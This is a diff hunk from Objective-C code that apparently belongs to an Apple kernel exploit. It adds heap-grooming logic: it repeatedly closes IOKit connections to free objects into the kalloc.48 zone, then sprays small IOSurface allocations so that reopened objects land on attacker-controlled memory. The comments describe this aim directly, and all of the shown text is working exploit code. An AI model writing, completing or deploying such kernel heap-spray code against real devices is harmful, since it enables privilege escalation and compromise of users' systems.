@@ -3491,15 +3491,26 @@ static const char kOpenPropertiesGarbage[] =
     uint32_t drainCloseErrs = 0, drainOpenErrs = 0;
     [self appendLog:[NSString stringWithFormat:@"  Allocation conditioning: %d close/reopen cycles across %d connections (ClientObject zone)...",
                      kMagazineDrainCycles, connCount]];
+    // Spray array: hold IOSurface refs to populate kalloc.48 with controlled data
+    NSMutableArray *spraySurfaces = [NSMutableArray array];
     for (int i = 0; i < kMagazineDrainCycles; i++) {
-        // Cycle all connections to maximize ClientObject churn in the zone
+        // Close all — ClientObjects freed to kalloc.48 zone
         for (int c = 0; c < connCount; c++) {
             uint64_t closeScalar = 0;
             kern_return_t ckr = sIOConnectCallMethod(connections[c], kSelectorClose,
                                  &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
             if (ckr != KERN_SUCCESS) drainCloseErrs++;
         }
-        // Reopen in reverse order — allocations pull from potentially different magazine positions
+        // Spray IOSurface props (~48 bytes each) into kalloc.48 BEFORE reopen
+        for (int s = 0; s < 50; s++) {
+            IOSurfaceRef sf = IOSurfaceCreate((CFDictionaryRef)@{
+                (id)kIOSurfaceWidth: @(1), (id)kIOSurfaceHeight: @(1),
+                (id)kIOSurfaceBytesPerRow: @(4), (id)kIOSurfaceBytesPerElement: @(4),
+                (id)kIOSurfacePixelFormat: @(0), (id)kIOSurfaceAllocSize: @(4),
+            });
+            if (sf) { [spraySurfaces addObject:(__bridge id)sf]; CFRelease(sf); }
+        }
+        // Reopen — some allocations may reuse our sprayed slots
         for (int c = connCount - 1; c >= 0; c--) {
             uint64_t openScalar = 0;
             const char *xml = kOpenPropertiesXML;
